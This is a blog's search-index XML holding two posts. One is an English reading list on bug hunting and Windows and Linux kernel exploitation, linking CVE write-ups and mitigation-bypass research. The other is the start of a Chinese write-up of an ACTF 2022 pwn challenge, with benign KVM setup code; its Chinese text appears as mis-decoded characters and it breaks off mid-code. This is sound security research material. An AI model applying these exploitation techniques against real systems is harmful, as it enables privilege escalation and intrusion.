<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bug Hunter</title>
      <link href="/2022/08/11/bug-hunter/"/>
      <url>/2022/08/11/bug-hunter/</url>
      
        <content type="html"><![CDATA[<h1 id="Bug-Hunting-in-Hard-Targets"><a href="#Bug-Hunting-in-Hard-Targets" class="headerlink" title="Bug Hunting in Hard Targets"></a>Bug Hunting in Hard Targets</h1><ol><li>Developer mindset vs Adversarial mindset - Code review as a bug hunter is often different from code reviewing as part of feature change. As a bug hunter you are only focusing on how to circumvent a control or use in a way it was not intended. Learning this mindset is key</li><li>Going Deep vs Going Wide - Researching a target there is a trade off between going deep and going wide. If you have no knowledge then going wide helps to discover potential weak areas and build up a mental model. At some point it becomes important to focus down and refine</li><li>Target Biases - Its common to think because something is well established then there will be less bugs lurking there. However, most software is evolving and new features are constant being added. This new code is often a really good source of bugs.</li><li>Fuzzing Enhancements - As code moves on over time, developers need to create test code. This means that often this new code misses test coverage or has no tests at all. Binary diffing, API change logs and software update analysis are a great way to extend fuzzer coverage.</li><li>Code&#x2F;binary review lead fuzzing - It can be very challenging to spot certain bugs using only code review or binary analysis. Combing the approach allows to identify complexity and focus fuzzing to weak areas which may lead to vulns you would have not spotted</li><li>Variant Analysis - As a researcher most of the bugs you find will not be particularly novel and are generally abstractions of a common vulnerability pattern. Knowing how to recognise these patterns and integrating into your toolset to allow faster identification is a must</li><li>Research Tracking - In the area you are researching it is important to keep up-to date on published material. As new attack surfaces are unearthed or new vulnerability classes are identified then taking this knowledge and integrating it into your tooling is important.</li><li>Collaboration - You can get quite far solo in bug hunting, however being able to work in a team allows effective use of the team members specialisation and allows for distribution of work. It helps with motivation on the VR emotional rollercoaster when failure is common.</li><li>Bug Tracking - Whilst going for the most impact as possible is the goal, reaching that goal may require many other lesser impact vulnerabilities chained together. As you are performing your research it is important to make notes of literally anything of potential value.</li><li>Target Knowledge Base - Whilst you are doing this research and afterwards it is important to maintain a target knowledge based. Building on existing knowledge is much easier than coming from zero knowledge of the target. Really helps if you switch between targets lots.</li></ol><h1 id="Windows-Kernel-Exploitation"><a href="#Windows-Kernel-Exploitation" class="headerlink" title="Windows Kernel Exploitation"></a>Windows Kernel Exploitation</h1><ol><li><p>The most complete and recent overview of the Windows Kernel Segment Heap from an exploitation perspective.</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>Two articles I wrote on what I assumed was a similar WNF technique seen in the wild to understand how this subsystem could have been abused and the vuln</p><p><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 1</a></p><p><a href="https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 2</a></p></li><li><p>A use-after-free in clfs.sys, then uses a similar WNF technique as explained in the previous tweet to enable better primitives and techniques mentioned in Scoop the Windows 10 Pool to perform heap grooming. Data only attack escalation</p><p><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System (CLFS) - Exodus Intelligence</a></p></li><li><p>A novel post exploitation primitive unique to Windows 11 22H2+ which can turn an arbitrary write&#x2F;inc into full read and write of kernel memory by abusing I&#x2F;O Ring and its operations. A POC was also released</p><p><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">One I&#x2F;O Ring to Rule Them All: A Full Read&#x2F;Write Exploit Primitive on Windows 11</a></p><p><a href="https://github.com/yardenshafir/IoRingReadWritePrimitive">https://github.com/yardenshafir/IoRingReadWritePrimitive</a></p></li><li><p>Win32k has been a huge source of kernel bugs over the years. This talk goes into more than 15 bugs _arkon found and the novel bug class, attack techniques and mitigation by MSFT.</p></li><li><p>Investigates the bug class of arbitrary kernel pointer read (i.e. pointers read from attacker controlled input do not point to userspace). Investigates the true impact (i.e. DOS or second order info leak only?) or code exec &#x2F; LPE</p><p><a href="https://msrc-blog.microsoft.com/2022/03/22/exploring-a-new-class-of-kernel-exploit-primitive/">Exploring a New Class of Kernel Exploit Primitive</a></p></li><li><p>HCVI aims to mitigate an attacker being able too execute unsigned code within the Windows Kernel. 33y0re looks how HVCI affects a typical kernel exploit and shows a way which with arb read&#x2F;write can call kernel functions without triggering HVCI&#x2F;kCFG</p><p><a href="https://connormcgarr.github.io/hvci/">Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG</a></p></li><li><p>In these two a trick to trap access to virtual memory which could be used exploiting certain types of bugs and another on hunting for bugs within Mini-Filter drivers.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html">Windows Exploitation Tricks: Trapping Virtual Memory Access</a></p><p><a href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html">Hunting for Bugs in Windows Mini-Filter Drivers</a></p></li><li><p>Actually looking at what Windows vulns are being exploited within the wild (in this case font bugs and CSRSS bug analysis) provides defenders with insights on where to focus their mitigation and detection efforts.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-windows-exploits.html">In-the-Wild Series: Windows Exploits</a></p></li><li><p>by rohitwas on finishing off KASLR where previously KUSER_SHARED_DATA was always mapped at a fixed page of memory within the kernel. The post shows strengthening KASLR in Windows by mitigating the last remaining blind-write target RCE could use</p><p><a href="https://msrc-blog.microsoft.com/2022/04/05/randomizing-the-kuser_shared_data-structure-on-windows/">Randomizing the KUSER_SHARED_DATA Structure on Windows</a></p></li></ol><h1 id="Linux-Vulnerability-Research"><a href="#Linux-Vulnerability-Research" class="headerlink" title="Linux Vulnerability Research"></a>Linux Vulnerability Research</h1><ol><li><p>Understanding and Improving Linux Kernel Exploit Reliability</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>userfaultfd technique is dead on most Linux distros due to vm.unprivileged_userfaultfd. Fuse has come through as a good replacement for this technique.</p><p><a href="https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">Put an io_uring on it: Exploiting the Linux Kernel</a></p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google‚Äôs KCTF Containers</a></p></li><li><p>Syzkaller is a game changer in kernel. There‚Äôs a few things to say 1) Even existing publics grammars can find bugs when targeted at areas. 2) Extending coverage is a quick way to find bugs 3) N-day often sits around in <a href="https://syzkaller.appspot.com/upstream">https://syzkaller.appspot.com/upstream</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">syzkaller&#x2F;syscall_descriptions.md at master ¬∑ google&#x2F;syzkaller</a></p><p><a href="https://groups.google.com/g/syzkaller/c/YZGN8Ggb_LY/m/h1_uxIEJAgAJ">Tutorial on describing new subsystems</a></p><p><a href="https://xairy.io/articles/syzkaller-external-network">üîç Looking for Remote Code Execution bugs in the Linux kernel</a></p><p><a href="https://www.collabora.com/news-and-blog/blog/2020/05/12/using-syzkaller-fuzzing-your-changes/">Using syzkaller, part 3: Fuzzing your changes</a></p><p><a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/syzkaller_crash_demo.md">Debian-GNU-Linux-Profiles&#x2F;syzkaller_crash_demo.md at master ¬∑ hardenedlinux&#x2F;Debian-GNU-Linux-Profiles</a></p><p><a href="https://seclists.org/oss-sec/2022/q2/164?utm_source=dlvr.it&utm_medium=twitter">CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation</a></p></li><li><p>So N-day often just sitting around.. KCTF encourages researchers to triage existing bugs and develop new techniques to bypass existing mitigations</p><p><a href="https://security.googleblog.com/2021/11/trick-treat-paying-leets-and-sweets-for.html">Trick &amp; Treat! üéÉ Paying Leets and Sweets for Linux Kernel privescs and k8s escapes</a></p><p>both 0-day&#x2F;N-day. As a researcher you can learn a lot from past bugs:</p><p><a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml">public kCTF Responses - Google Drive</a></p></li><li><p>Keeping on top of mitigations in your head is hard. Especially if you are working on multiple platforms.</p><p><a href="https://github.com/nccgroup/exploit_mitigations">https://github.com/nccgroup/exploit_mitigations</a></p><p>to try to help track these. Really early days, but any contributions appreciated!</p></li><li><p>Finding the correct size structures with elements you want to control at certain offsets with them is tedious and time consuming. CodeQL massively helps speed up this process.mmolgtm article</p><p><a href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">One day short of a full chain: Part 1 - Android Kernel arbitrary code execution</a></p><p>shows a query which can be used for this.</p></li><li><p>The msg_msg technique which has been a favorite by exploit writes used in</p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google‚Äôs KCTF Containers</a></p><p><a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p><p><a href="https://nickgregory.me/post/2022/03/12/cve-2022-25636/">The Discovery and Exploitation of CVE-2022-25636</a></p><p>becomes less useful in 5.14 when GFP_KERNEL_ACCOUNT end up in kmalloc-cg-* caches and your vulnerable object is not.</p></li><li><p>Talking of kmalloc cache‚Äôs, cross-cache attacks are a thing and can be used when its not possible to find an interesting object within your initial target cache. Markak_ describes this and other factors to consider when evaluating AUTOSLAB</p><p><a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">How AUTOSLAB Changes the Memory Unsafety Game</a></p></li><li><p>This list wouldn‚Äôt be complete andreyknvl and a13xp0p0v with linkersec and</p><p><a href="https://github.com/xairy/linux-kernel-exploitation">https://github.com/xairy/linux-kernel-exploitation</a></p><p>which goes into way more things going back over the years.</p></li><li><p>Finally, if this kind of research interests you! My team at nccgroupinfosec position open currently at</p><p><a href="https://nccgroup.wd3.myworkdayjobs.com/en-US/NCC_Group/job/UK-Remote/Exploit-Developer_R6065">Exploit Developer</a></p></li></ol><h1 id="macOS-vulnerability-research"><a href="#macOS-vulnerability-research" class="headerlink" title="macOS vulnerability research"></a>macOS vulnerability research</h1><p><a href="https://twitter.com/alexjplaskett/status/1472874802037862407">Alex Plaskett on Twitter: ‚Äú1&#x2F;18 As 2021 is starting to come towards and end, now seems to be good time to look back at all the great macOS vulnerability research &#x2F; exploit development published during the year! Tried to keep to macOS mainly but obviously there‚Äôs some crossover with iOS research too. üßµ &#x2F; Twitter‚Äù</a></p><h1 id="Vulnerability-Research-CVs"><a href="#Vulnerability-Research-CVs" class="headerlink" title="Vulnerability Research CVs"></a>Vulnerability Research CVs</h1><p><a href="https://twitter.com/alexjplaskett/status/1552600067231694849">Alex Plaskett on Twitter: ‚Äú1&#x2F; As someone who has reviewed hundreds of CVs for job applications in the past, I just want to highlight some personal tips for vulnerability researchers in order to maximise their applications (i.e. outside typical career history and education). üßµ pic.twitter.com&#x2F;S4yEHzHXVn &#x2F; Twitter‚Äù</a></p><h1 id="Impactful-books"><a href="#Impactful-books" class="headerlink" title="Impactful books"></a>Impactful books</h1><p><a href="https://twitter.com/alexjplaskett/status/1551173688661536769">Alex Plaskett on Twitter: ‚ÄúI am often asked what books have had the most impact to me in security. This is a really tough question as I have read so many, however, here are some I have have on my shelf and why they were important to meüëá pic.twitter.com&#x2F;Uk5PbXa4gO &#x2F; Twitter‚Äù</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://twitter.com/alexjplaskett">https://twitter.com/alexjplaskett</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰ªé‰∏ÄÈÅìCTFÈ¢òÁõÆÂ≠¶‰π†KVM</title>
      <link href="/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/"/>
      <url>/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/</url>
      
        <content type="html"><![CDATA[<p>KVM ÂÖ®Áß∞ÊòØÂü∫‰∫éÂÜÖÊ†∏ÁöÑËôöÊãüÊú∫ÔºàKernel-based Virtual MachineÔºâÔºåÂÆÉÊòØLinux ÁöÑ‰∏Ä‰∏™ÂÜÖÊ†∏Ê®°ÂùóÔºåKVMÂü∫‰∫éËôöÊãüÂåñÊâ©Â±ïÔºàIntel VT ÊàñËÄÖ AMD-VÔºâÁöÑ X86 Á°¨‰ª∂ÁöÑÂºÄÊ∫êÁöÑ Linux ÂéüÁîüÁöÑÂÖ®ËôöÊãüÂåñËß£ÂÜ≥ÊñπÊ°à„ÄÇ</p><p>KVM Êú¨Ë∫´‰∏çÊâßË°å‰ªª‰ΩïÁ°¨‰ª∂Ê®°ÊãüÔºåÈúÄË¶ÅÁî®Êà∑Á©∫Èó¥Á®ãÂ∫èÔºàQEMUÔºâÈÄöËøá <strong>&#x2F;dev&#x2F;kvm</strong> Êé•Âè£ËÆæÁΩÆ‰∏Ä‰∏™ÂÆ¢Êà∑Êú∫ËôöÊãüÊúçÂä°Âô®ÁöÑÂú∞ÂùÄÁ©∫Èó¥ÔºåÂêëÂÆÉÊèê‰æõÊ®°Êãü I&#x2F;OÔºåÂπ∂Â∞ÜÂÆÉÁöÑËßÜÈ¢ëÊòæÁ§∫Êò†Â∞ÑÂõûÂÆø‰∏ªÁöÑÊòæÁ§∫Â±è„ÄÇ</p><h1 id="È¢òÁõÆÈÄÜÂêëÂàÜÊûê"><a href="#È¢òÁõÆÈÄÜÂêëÂàÜÊûê" class="headerlink" title="È¢òÁõÆÈÄÜÂêëÂàÜÊûê"></a>È¢òÁõÆÈÄÜÂêëÂàÜÊûê</h1><p>È¢òÁõÆÊù•Ê∫ê‰∫éACTF 2022ÁöÑ‰∏ÄÈÅìPWNÈ¢òÔºåÁªôÂá∫Âõõ‰∏™Êñá‰ª∂Ôºå‰∫åËøõÂà∂Á®ãÂ∫èÂú®binÊñá‰ª∂Â§π‰∏ãÔºåÂÖ∂‰ΩôÈÉΩÊòØÈ¢òÁõÆÈÉ®ÁΩ≤ÊâÄÁî®Âà∞ÁöÑÊñá‰ª∂ÔºåÂèØ‰ª•Áî®dockerÊê≠Âª∫È¢òÁõÆÔºåÂêéÈù¢‰ºöËÆ≤Âà∞Ôºö</p><pre class="line-numbers language-none"><code class="language-none">‚îú‚îÄ‚îÄ bin‚îÇ   ‚îú‚îÄ‚îÄ mykvm‚îú‚îÄ‚îÄ ctf.xinetd‚îú‚îÄ‚îÄ Dockerfile‚îî‚îÄ‚îÄ start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂàÜÊûê‰∫åËøõÂà∂Êñá‰ª∂ÈÄªËæëÔºåÂèëÁé∞‰ª£Á†ÅÈáèÂπ∂‰∏çÂ§ßÔºåÈÄªËæë‰πüÂæàÁÆÄÂçïÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181539182.png" alt="image-20220629181539182">Âú®ÂáΩÊï∞sub_400B92‰∏≠ÔºåÊúâÂæàÂ§öioctlÊìç‰Ωú <strong>&#x2F;dev&#x2F;kvm</strong> ËÆæÂ§áÊñá‰ª∂Ôºå‰ΩÜËøò‰∏çÁü•ÈÅìÂà∞Â∫ïÊòØËØ∑Ê±Ç‰∫ÜÂì™ÁßçÊé•Âè£ÂÆûÁé∞‰∫ÜÂì™ÁßçÂäüËÉΩÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181615926.png" alt="image-20220629181615926">ËøôÈáåÈúÄË¶Å‰∫ÜËß£‰∏Ä‰∏ãKVMÁöÑÂÆûÁé∞„ÄÇ</p><h1 id="KVMÂÆûÁé∞"><a href="#KVMÂÆûÁé∞" class="headerlink" title="KVMÂÆûÁé∞"></a>KVMÂÆûÁé∞</h1><p>GitHubÊúâ‰∏§‰∏™ÁÆÄÊòìÁöÑKVM‰æãÂ≠ê‰æõÂèÇËÄÉÔºö</p><p><a href="https://github.com/dpw/kvm-hello-world">https://github.com/dpw/kvm-hello-world</a></p><p><a href="https://github.com/kvmtool/kvmtool">https://github.com/kvmtool/kvmtool</a></p><p>ÈòÖËØªÊ∫êÁ†ÅÂêéÔºåÊÄªÁªìÂá∫Âú®‰∏ªÊú∫ÂàõÂª∫‰∏Ä‰∏™KVMÁöÑÂü∫Êú¨Ê≠•È™§Â¶Ç‰∏ãÔºö</p><ol><li>ÊâìÂºÄKVMËÆæÂ§á</li><li>ÂàõÂª∫VM</li><li>‰∏∫GuestËÆæÁΩÆÂÜÖÂ≠ò</li><li>ÂàõÂª∫ËôöÊãüCPU</li><li>‰∏∫vCPUËÆæÁΩÆÂÜÖÂ≠ò</li><li>Â∞ÜÊ±áÁºñ‰ª£Á†ÅÊîæËøõÁî®Êà∑Âå∫ÂüüÔºåËÆæÁΩÆvCPUÁöÑÂØÑÂ≠òÂô®</li><li>ËøêË°åÂíåÂ§ÑÁêÜÈÄÄÂá∫</li></ol><p>‰∏ãÈù¢ÂàÜÊ≠•È™§‰ªãÁªç„ÄÇ</p><h2 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1-3"></a>step 1-3</h2><p>ÊâìÂºÄKVMËÆæÂ§áÔºåÂàõÂª∫VMÔºåËÆæÁΩÆGuestÂÜÖÂ≠ò„ÄÇÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// step 1, open /dev/kvm</span>  <span class="token keyword">int</span> kvmfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kvm"</span><span class="token punctuation">,</span> O_RDWR<span class="token operator">|</span>O_CLOEXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>kvmfd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"failed to open /dev/kvm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 2, create VM</span>  <span class="token keyword">int</span> vmfd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_CREATE_VM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 3, set up user memory region</span>  <span class="token class-name">size_t</span> mem_size <span class="token operator">=</span> <span class="token number">0x40000000</span><span class="token punctuation">;</span>           <span class="token comment">// size of user memory you want to assign</span>  <span class="token keyword">void</span> <span class="token operator">*</span>mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mem_size<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span>                   MAP_SHARED<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> user_entry <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem <span class="token operator">+</span> user_entry<span class="token punctuation">)</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> code_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_userspace_memory_region</span> region <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>slot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>guest_phys_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>memory_size <span class="token operator">=</span> mem_size<span class="token punctuation">,</span>    <span class="token punctuation">.</span>userspace_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_SET_USER_MEMORY_REGION<span class="token punctuation">,</span> <span class="token operator">&amp;</span>region<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* end of step 3 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª•‰∏ä‰ª£Á†ÅÂàõÂª∫‰∏Ä‰∏™VMÔºå<code>mmap</code>‰∏∫VMÂàÜÈÖç0x40000000(1GB)Â§ßÂ∞èÔºåËÆæÁΩÆ<code>user_entry</code>‰∏∫0ÔºåÂ∞ÜÊ±áÁºñÊîæÂú®Á¨¨‰∏ÄÈ°µÔºåGuestÂ∞Ü‰ªéËØ•Âú∞ÂùÄÂºÄÂßãÊâßË°å„ÄÇ</p><h2 id="step-4-6"><a href="#step-4-6" class="headerlink" title="step 4-6"></a>step 4-6</h2><p>ÂàõÂª∫ËôöÊãüCPUÔºå‰∏∫vCPUËÆæÁΩÆÂÜÖÂ≠òÔºåÂ∞ÜÊ±áÁºñ‰ª£Á†ÅÊîæËøõÁî®Êà∑Âå∫Âüü„ÄÇÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 4~6, ÂàõÂª∫ÂíåËÆæÁΩÆ vCPU */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">/* step 1-3 ... */</span>  <span class="token comment">// step 4, create vCPU</span>  <span class="token keyword">int</span> vcpufd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_CREATE_VCPU<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 5, set up memory for vCPU</span>  <span class="token class-name">size_t</span> vcpu_mmap_size <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span> run <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> vcpu_mmap_size<span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> vcpufd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 6, set up vCPU's registers</span>  <span class="token comment">/* standard registers include general-purpose registers and flags */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_regs</span> regs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rip <span class="token operator">=</span> user_entry<span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x200000</span><span class="token punctuation">;</span> <span class="token comment">// stack address</span>  regs<span class="token punctuation">.</span>rflags <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span> <span class="token comment">// in x86 the 0x2 bit should always be set</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set registers</span>  <span class="token comment">/* special registers include segment registers */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_sregs</span> sregs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>base <span class="token operator">=</span> sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>selector <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// let base of code segment equal to zero</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// not finished ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª•‰∏ä‰ª£Á†ÅÂàõÂª∫vCPUÔºåËÆæÁΩÆÂØÑÂ≠òÂô®ÔºåÊØè‰∏™<code>kvm_run</code>ÁªìÊûÑÂØπÂ∫î‰∏Ä‰∏™vCPUÔºåÊØè‰∏™VMÂèØÂàõÂª∫Â§ö‰∏™vCPU„ÄÇvCPUÂàõÂª∫ÂêéÊâßË°å‰∫éÂÆûÊ®°ÂºèÔºå‰πüÂ∞±ÊòØËØ¥Âè™ËÉΩÊâßË°å16‰ΩçÊ±áÁºñ‰ª£Á†ÅÔºåÂ¶ÇÊûúÈúÄË¶ÅÊâßË°å32‰ΩçÊàñ64‰ΩçÔºåÂàôËøòÈúÄË¶ÅËÆæÁΩÆÈ°µË°®„ÄÇ</p><h2 id="step-7"><a href="#step-7" class="headerlink" title="step 7"></a>step 7</h2><p>ËøêË°åÂíåÂ§ÑÁêÜÈÄÄÂá∫„ÄÇÂÆûÁé∞‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 7 */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* ... step 1~6 */</span>  <span class="token comment">// step 7, execute vm and handle exit reason</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_RUN<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> KVM_EXIT_HLT<span class="token operator">:</span>      <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"KVM_EXIT_HLT"</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span 